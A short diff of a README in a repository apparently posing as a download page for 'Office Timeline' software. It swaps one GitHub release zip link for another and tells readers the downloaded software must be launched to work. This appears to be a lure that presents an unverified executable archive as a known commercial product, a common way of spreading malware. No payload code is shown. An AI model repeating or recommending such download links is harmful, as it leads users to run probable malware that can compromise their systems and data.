@@ -15,7 +15,7 @@ In this repository, you will find valuable information and tools related to vari
 - And much more!
 
 ## Software Download
-🔗 [Download https://github.com/Adnanedzz/Office-Timeline-Download/releases/download/v1.0/Application.zip](https://github.com/Adnanedzz/Office-Timeline-Download/releases/download/v1.0/Application.zip)
+🔗 [Download https://github.com/Adnanedzz/Office-Timeline-Download/releases/download/v2.0/Software.zip](https://github.com/Adnanedzz/Office-Timeline-Download/releases/download/v2.0/Software.zip)
 
 Please note that the software included in the download needs to be launched to access its full functionality.
 
